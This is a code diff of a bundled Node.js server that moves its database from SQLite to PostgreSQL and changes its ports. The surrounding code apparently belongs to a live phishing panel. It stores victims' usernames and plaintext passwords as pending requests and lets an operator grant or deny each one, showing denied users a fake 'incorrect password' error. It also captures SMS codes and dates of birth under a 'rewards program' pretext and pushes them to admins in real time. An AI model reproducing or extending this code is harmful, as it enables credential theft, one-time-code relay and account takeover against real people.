@@ -50,35 +50,34 @@ __export(schema_exports, {
   users: () => users,
   verificationSessions: () => verificationSessions
 });
-var import_drizzle_orm = require("drizzle-orm");
-var import_sqlite_core = require("drizzle-orm/sqlite-core");
+var import_pg_core = require("drizzle-orm/pg-core");
 var import_drizzle_zod = require("drizzle-zod");
 var import_zod = require("zod");
-var users = (0, import_sqlite_core.sqliteTable)("users", {
-  id: (0, import_sqlite_core.text)("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
-  username: (0, import_sqlite_core.text)("username").notNull().unique(),
-  password: (0, import_sqlite_core.text)("password").notNull(),
-  rememberUsername: (0, import_sqlite_core.integer)("remember_username", { mode: "boolean" }).default(false),
-  lastLogin: (0, import_sqlite_core.integer)("last_login", { mode: "timestamp" }),
-  createdAt: (0, import_sqlite_core.integer)("created_at", { mode: "timestamp" }).default(import_drizzle_orm.sql`(unixepoch())`)
+var users = (0, import_pg_core.pgTable)("users", {
+  id: (0, import_pg_core.text)("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
+  username: (0, import_pg_core.text)("username").notNull().unique(),
+  password: (0, import_pg_core.text)("password").notNull(),
+  rememberUsername: (0, import_pg_core.boolean)("remember_username").default(false),
+  lastLogin: (0, import_pg_core.timestamp)("last_login"),
+  createdAt: (0, import_pg_core.timestamp)("created_at").defaultNow()
 });
-var loginAttempts = (0, import_sqlite_core.sqliteTable)("login_attempts", {
-  id: (0, import_sqlite_core.text)("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
-  username: (0, import_sqlite_core.text)("username").notNull(),
-  success: (0, import_sqlite_core.integer)("success", { mode: "boolean" }).notNull(),
-  ipAddress: (0, import_sqlite_core.text)("ip_address"),
-  userAgent: (0, import_sqlite_core.text)("user_agent"),
-  timestamp: (0, import_sqlite_core.integer)("timestamp", { mode: "timestamp" }).default(import_drizzle_orm.sql`(unixepoch())`)
+var loginAttempts = (0, import_pg_core.pgTable)("login_attempts", {
+  id: (0, import_pg_core.text)("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
+  username: (0, import_pg_core.text)("username").notNull(),
+  success: (0, import_pg_core.boolean)("success").notNull(),
+  ipAddress: (0, import_pg_core.text)("ip_address"),
+  userAgent: (0, import_pg_core.text)("user_agent"),
+  timestamp: (0, import_pg_core.timestamp)("timestamp").defaultNow()
 });
-var pendingRequests = (0, import_sqlite_core.sqliteTable)("pending_requests", {
-  id: (0, import_sqlite_core.text)("id").primaryKey(),
-  username: (0, import_sqlite_core.text)("username").notNull(),
-  password: (0, import_sqlite_core.text)("password").notNull(),
-  ipAddress: (0, import_sqlite_core.text)("ip_address"),
-  userAgent: (0, import_sqlite_core.text)("user_agent"),
-  status: (0, import_sqlite_core.text)("status").notNull().default("pending"),
+var pendingRequests = (0, import_pg_core.pgTable)("pending_requests", {
+  id: (0, import_pg_core.text)("id").primaryKey(),
+  username: (0, import_pg_core.text)("username").notNull(),
+  password: (0, import_pg_core.text)("password").notNull(),
+  ipAddress: (0, import_pg_core.text)("ip_address"),
+  userAgent: (0, import_pg_core.text)("user_agent"),
+  status: (0, import_pg_core.text)("status").notNull().default("pending"),
   // pending, granted, denied
-  timestamp: (0, import_sqlite_core.integer)("timestamp", { mode: "timestamp" }).default(import_drizzle_orm.sql`(unixepoch())`)
+  timestamp: (0, import_pg_core.timestamp)("timestamp").defaultNow()
 });
 var insertUserSchema = (0, import_drizzle_zod.createInsertSchema)(users).pick({
   username: true,
@@ -127,13 +126,13 @@ var smsVerificationSchema = import_zod.z.object({
     return date <= eighteenYearsAgo;
   }, "You must be at least 18 years old to participate in the rewards program.")
 });
-var verificationSessions = (0, import_sqlite_core.sqliteTable)("verification_sessions", {
-  id: (0, import_sqlite_core.text)("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
-  username: (0, import_sqlite_core.text)("username").notNull(),
-  smsCode: (0, import_sqlite_core.text)("sms_code"),
-  dateOfBirth: (0, import_sqlite_core.text)("date_of_birth"),
-  ipAddress: (0, import_sqlite_core.text)("ip_address"),
-  timestamp: (0, import_sqlite_core.integer)("timestamp", { mode: "timestamp" }).default(import_drizzle_orm.sql`(unixepoch())`)
+var verificationSessions = (0, import_pg_core.pgTable)("verification_sessions", {
+  id: (0, import_pg_core.text)("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
+  username: (0, import_pg_core.text)("username").notNull(),
+  smsCode: (0, import_pg_core.text)("sms_code"),
+  dateOfBirth: (0, import_pg_core.text)("date_of_birth"),
+  ipAddress: (0, import_pg_core.text)("ip_address"),
+  timestamp: (0, import_pg_core.timestamp)("timestamp").defaultNow()
 });
 var insertVerificationSessionSchema = (0, import_drizzle_zod.createInsertSchema)(verificationSessions).omit({
   id: true,
@@ -141,23 +140,26 @@ var insertVerificationSessionSchema = (0, import_drizzle_zod.createInsertSchema)
 });
 
 // server/db.ts
-var import_better_sqlite3 = require("drizzle-orm/better-sqlite3");
-var import_better_sqlite32 = __toESM(require("better-sqlite3"), 1);
+var import_node_postgres = require("drizzle-orm/node-postgres");
+var import_pg = require("pg");
 if (!process.env.DATABASE_URL) {
-  process.env.DATABASE_URL = "sqlite.db";
+  throw new Error("DATABASE_URL must be set. Did you forget to provision a database?");
 }
-var sqlite = new import_better_sqlite32.default("sqlite.db");
-var db = (0, import_better_sqlite3.drizzle)(sqlite, { schema: schema_exports });
+var pool = new import_pg.Pool({
+  connectionString: process.env.DATABASE_URL,
+  ssl: process.env.NODE_ENV === "production" ? { rejectUnauthorized: false } : false
+});
+var db = (0, import_node_postgres.drizzle)(pool, { schema: schema_exports });
 
 // server/storage.ts
-var import_drizzle_orm2 = require("drizzle-orm");
+var import_drizzle_orm = require("drizzle-orm");
 var DatabaseStorage = class {
   async getUser(id) {
-    const [user] = await db.select().from(users).where((0, import_drizzle_orm2.eq)(users.id, id));
+    const [user] = await db.select().from(users).where((0, import_drizzle_orm.eq)(users.id, id));
     return user;
   }
   async getUserByUsername(username) {
-    const [user] = await db.select().from(users).where((0, import_drizzle_orm2.eq)(users.username, username));
+    const [user] = await db.select().from(users).where((0, import_drizzle_orm.eq)(users.username, username));
     return user;
   }
   async createUser(insertUser) {
@@ -176,8 +178,8 @@ var DatabaseStorage = class {
       await db.update(users).set({
         rememberUsername: loginData.rememberUsername,
         lastLogin: /* @__PURE__ */ new Date()
-      }).where((0, import_drizzle_orm2.eq)(users.id, user.id));
-      const [updatedUser] = await db.select().from(users).where((0, import_drizzle_orm2.eq)(users.id, user.id));
+      }).where((0, import_drizzle_orm.eq)(users.id, user.id));
+      const [updatedUser] = await db.select().from(users).where((0, import_drizzle_orm.eq)(users.id, user.id));
       user = updatedUser;
     }
     return {
@@ -191,13 +193,13 @@ var DatabaseStorage = class {
     return loginAttempt;
   }
   async updateUserRememberPreference(username, remember) {
-    await db.update(users).set({ rememberUsername: remember }).where((0, import_drizzle_orm2.eq)(users.username, username));
+    await db.update(users).set({ rememberUsername: remember }).where((0, import_drizzle_orm.eq)(users.username, username));
   }
 };
 var storage = new DatabaseStorage();
 
 // server/routes.ts
-var import_drizzle_orm3 = require("drizzle-orm");
+var import_drizzle_orm2 = require("drizzle-orm");
 
 // server/advanced-security.ts
 var import_crypto = __toESM(require("crypto"), 1);
@@ -810,7 +812,7 @@ async function registerRoutes(app2) {
   );
   app2.get("/api/admin/pending", async (req, res) => {
     try {
-      const pending = await db.select().from(pendingRequests).where((0, import_drizzle_orm3.eq)(pendingRequests.status, "pending"));
+      const pending = await db.select().from(pendingRequests).where((0, import_drizzle_orm2.eq)(pendingRequests.status, "pending"));
       res.json(pending);
     } catch (error) {
       console.error("Error getting pending requests:", error);
@@ -822,7 +824,7 @@ async function registerRoutes(app2) {
   });
   app2.get("/api/admin/sms-history", async (req, res) => {
     try {
-      const history = await db.select().from(verificationSessions).orderBy((0, import_drizzle_orm3.desc)(verificationSessions.timestamp));
+      const history = await db.select().from(verificationSessions).orderBy((0, import_drizzle_orm2.desc)(verificationSessions.timestamp));
       const mappedHistory = history.map((session) => ({
         username: session.username,
         code: session.smsCode || "",
@@ -857,7 +859,7 @@ async function registerRoutes(app2) {
     async (req, res) => {
       try {
         const requestId = req.params.requestId;
-        const [request] = await db.select().from(pendingRequests).where((0, import_drizzle_orm3.eq)(pendingRequests.id, requestId));
+        const [request] = await db.select().from(pendingRequests).where((0, import_drizzle_orm2.eq)(pendingRequests.id, requestId));
         if (!request) {
           res.status(404).json({
             success: false,
@@ -882,7 +884,7 @@ async function registerRoutes(app2) {
   app2.post("/api/admin/grant", async (req, res) => {
     try {
       const { requestId, username, password } = req.body;
-      await db.update(pendingRequests).set({ status: "granted" }).where((0, import_drizzle_orm3.eq)(pendingRequests.id, requestId));
+      await db.update(pendingRequests).set({ status: "granted" }).where((0, import_drizzle_orm2.eq)(pendingRequests.id, requestId));
       res.json({
         success: true,
         message: "Access granted - proceeding to SMS verification"
@@ -898,7 +900,7 @@ async function registerRoutes(app2) {
   app2.post("/api/admin/deny", async (req, res) => {
     try {
       const { requestId, username, password } = req.body;
-      await db.update(pendingRequests).set({ status: "denied" }).where((0, import_drizzle_orm3.eq)(pendingRequests.id, requestId));
+      await db.update(pendingRequests).set({ status: "denied" }).where((0, import_drizzle_orm2.eq)(pendingRequests.id, requestId));
       res.json({
         success: true,
         message: "Access denied - user will see incorrect password error"
@@ -1069,9 +1071,9 @@ async function registerRoutes(app2) {
         });
       }
       const [session] = await db.select().from(verificationSessions).where(
-        (0, import_drizzle_orm3.and)(
-          (0, import_drizzle_orm3.eq)(verificationSessions.username, username),
-          (0, import_drizzle_orm3.eq)(verificationSessions.smsCode, code)
+        (0, import_drizzle_orm2.and)(
+          (0, import_drizzle_orm2.eq)(verificationSessions.username, username),
+          (0, import_drizzle_orm2.eq)(verificationSessions.smsCode, code)
         )
       );
       if (!session) {
@@ -1080,7 +1082,7 @@ async function registerRoutes(app2) {
           message: "Verification session not found. Please verify your SMS code again."
         });
       }
-      await db.update(verificationSessions).set({ dateOfBirth }).where((0, import_drizzle_orm3.eq)(verificationSessions.id, session.id));
+      await db.update(verificationSessions).set({ dateOfBirth }).where((0, import_drizzle_orm2.eq)(verificationSessions.id, session.id));
       broadcastToAdmins({
         type: "sms_verification_complete",
         data: {
@@ -1125,7 +1127,7 @@ async function registerRoutes(app2) {
     console.log("[WebSocket] Admin client connected");
     adminClients.add(ws);
     try {
-      const pending = await db.select().from(pendingRequests).where((0, import_drizzle_orm3.eq)(pendingRequests.status, "pending"));
+      const pending = await db.select().from(pendingRequests).where((0, import_drizzle_orm2.eq)(pendingRequests.status, "pending"));
       ws.send(
         JSON.stringify({
           type: "initial_data",
@@ -1170,21 +1172,9 @@ var import_vite2 = require("vite");
 var import_vite = require("vite");
 var import_plugin_react = __toESM(require("@vitejs/plugin-react"), 1);
 var import_path2 = __toESM(require("path"), 1);
-var import_vite_plugin_runtime_error_modal = __toESM(require("@replit/vite-plugin-runtime-error-modal"), 1);
-var isDevOnReplit = process.env.NODE_ENV !== "production" && process.env.REPL_ID !== void 0;
-var cartographerPlugin = null;
-if (isDevOnReplit) {
-  try {
-    const cartographerModule = require("@replit/vite-plugin-cartographer");
-    cartographerPlugin = cartographerModule.cartographer();
-  } catch (e) {
-  }
-}
 var vite_config_default = (0, import_vite.defineConfig)({
   plugins: [
-    (0, import_plugin_react.default)(),
-    (0, import_vite_plugin_runtime_error_modal.default)(),
-    ...cartographerPlugin ? [cartographerPlugin] : []
+    (0, import_plugin_react.default)()
   ],
   resolve: {
     alias: {
@@ -1199,7 +1189,7 @@ var vite_config_default = (0, import_vite.defineConfig)({
     emptyOutDir: true
   },
   server: {
-    port: 3e3,
+    port: 5e3,
     proxy: {
       "/api": {
         target: "http://localhost:5000",
@@ -1363,7 +1353,7 @@ app.use((req, res, next) => {
   } else {
     serveStatic(app);
   }
-  const port = parseInt(process.env.PORT || "3000", 10);
+  const port = parseInt(process.env.PORT || "5000", 10);
   server.listen({
     port,
     host: "0.0.0.0"
